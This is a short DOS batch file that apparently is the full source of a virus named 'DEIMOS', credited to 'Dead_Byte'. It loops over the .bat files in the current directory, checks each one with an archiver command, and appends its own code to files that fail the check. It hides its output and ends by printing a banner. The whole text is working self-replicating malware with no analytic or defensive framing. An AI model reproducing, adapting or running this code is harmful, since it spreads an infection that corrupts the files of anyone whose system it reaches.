   if "%1"=="D" goto test >nul
   for %%f in (*.bat) do call %0 D %%f>nul
   goto end>nul
   :test
   arj l %2 >NUL
   if errorlevel 1 goto infect
   goto end
   :infect
   copy %2+%0 /b>NUL
   :end






   cls
   echo
   echo        virus  "DEIMOS"
   echo
   echo                Dead_Byte
